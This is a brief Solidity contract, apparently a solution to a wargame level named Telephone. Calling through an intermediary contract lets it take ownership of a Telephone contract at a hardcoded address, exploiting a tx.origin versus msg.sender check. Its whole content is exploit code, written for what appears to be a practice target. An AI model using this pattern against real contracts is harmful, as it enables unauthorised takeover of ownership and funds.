// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract GetThePhone {
    address public owner;
    Telephone telephone = Telephone(0xAF64cEF71C79106135aEc6cc74dE0d321e117450);

    constructor(){
        owner = msg.sender;
    }

    function changeOwner() public {
        telephone.changeOwner(owner);
    }
}
